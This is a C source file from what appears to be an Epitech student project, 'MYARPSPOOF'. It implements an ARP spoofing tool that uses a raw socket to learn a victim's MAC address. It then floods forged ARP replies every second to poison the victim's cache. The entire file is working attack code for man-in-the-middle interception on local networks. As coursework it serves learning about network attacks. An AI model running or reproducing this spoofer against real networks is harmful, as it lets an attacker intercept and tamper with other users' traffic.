/*
** EPITECH PROJECT, 2018
** MYARPSPOOF
** File description:
** arpspoof.c
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include "spoof.h"

static void send_arp(int sd, struct sockaddr_ll *sockaddr, unsigned char buf[])
{
    int ret = 0;

    buf[32] = 0x00;
    printf("Send\n");
    if ((ret = sendto(sd, buf, 42, 0
            , (struct sockaddr *)sockaddr, sizeof(*sockaddr))) == -1) {
        perror("Failed sendto");
        exit(FAILURE);
    }
}

static void receiv_arp(int sd, arp_header_t *arp, struct ethhdr *send_req)
{
    unsigned char buf[BUF_SIZE];
    int ret = 0;
    struct ethhdr *rcv_resp= (struct ethhdr *)buf;
    arp_header_t *arp_rep = (arp_header_t *)(buf + ETH2_HEADER_LEN);

    printf("Recveive\n");
    memset(buf, 0x00, BUF_SIZE);
    while (true) {
        if ((ret = recvfrom(sd, buf, BUF_SIZE, 0, NULL, NULL)) == -1) {
            perror("Failed recvfrom");
            exit(FAILURE);
        }
        if(htons(rcv_resp->h_proto) == PROTO_ARP) {
            printf("Found victim's MAC address: '");
            for(int i = 0; i < 6; ++i) {
                arp->target_mac[i] = arp_rep->sender_mac[i];
                send_req->h_dest[i] = arp_rep->sender_mac[i];
                printf("%02X", arp->target_mac[i]);
                if (i < 5)
                    printf(":");
            }
            printf("'\n");
            arp->opcode = htons(ARP_REPLY);
            break;
        }
    }
}

static void arpspoof(int sd, int ifindex, struct ifreq *if_mac, char **av)
{
    unsigned char buf[BUF_SIZE];
    struct ethhdr *send_req = (struct ethhdr *)buf;
    struct sockaddr_ll sock_addr;
    arp_header_t *arp = (arp_header_t *)(buf + ETH2_HEADER_LEN);

    memset(buf, 0x00, BUF_SIZE);
    fill_arp(arp, ARP_REQUEST, NULL, 0);
    fill_arp_eth(send_req, arp, &sock_addr, if_mac);
    fill_sock_addr(&sock_addr, ifindex);
    fill_arp_send_target(arp, av[0], av[1]);
    send_arp(sd, &sock_addr, buf);
    receiv_arp(sd, arp, send_req);
    while (true) {
        // printf("Spoofed packet sent to '%s\n", );
        send_arp(sd, &sock_addr, buf);
        sleep(1);
    }
}

int init_arpspoof(int ac, char **av)
{
    int sd = 0;
    int ifindex = 0;
    struct ifreq if_mac;

    if (ac >= 5)
        return (print_function(av));
    if (!create_socket(&sd))
        return (FAILURE);
    if (!check_ioctl(sd, SIOCGIFINDEX, &if_mac, av[2]))
        return (FAILURE);
    ifindex = if_mac.ifr_ifindex;
    if (!check_ioctl(sd, SIOCGIFHWADDR, &if_mac, av[2]))
        return (FAILURE);
    arpspoof(sd, ifindex, &if_mac, av);
    close(sd);
    return (SUCCESS);
}